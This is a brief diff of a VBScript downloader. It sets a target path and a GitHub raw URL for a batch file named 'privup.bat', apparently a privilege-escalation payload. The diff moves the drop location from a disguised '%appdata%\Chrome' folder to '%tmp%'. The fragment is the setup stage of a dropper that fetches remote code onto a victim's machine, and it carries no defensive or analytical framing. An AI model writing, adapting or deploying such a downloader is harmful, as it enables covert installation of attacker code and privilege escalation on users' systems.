@@ -1,10 +1,8 @@
 Dim i, objFile, objFSO, objHTTP, strFile
 
 Set WshShell = CreateObject("WScript.Shell")
-Home = WshShell.ExpandEnvironmentStrings("%appdata%")
-WshShell.Run "cmd /c mkdir %appdata%\Chrome", 0, True
-Set WshShell = Nothing
-file = Home & "\Chrome\privup.bat"
+Home = WshShell.ExpandEnvironmentStrings("%tmp%")
+file = Home & "\privup.bat"
 
 myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-privup.bat"
 myPath = file
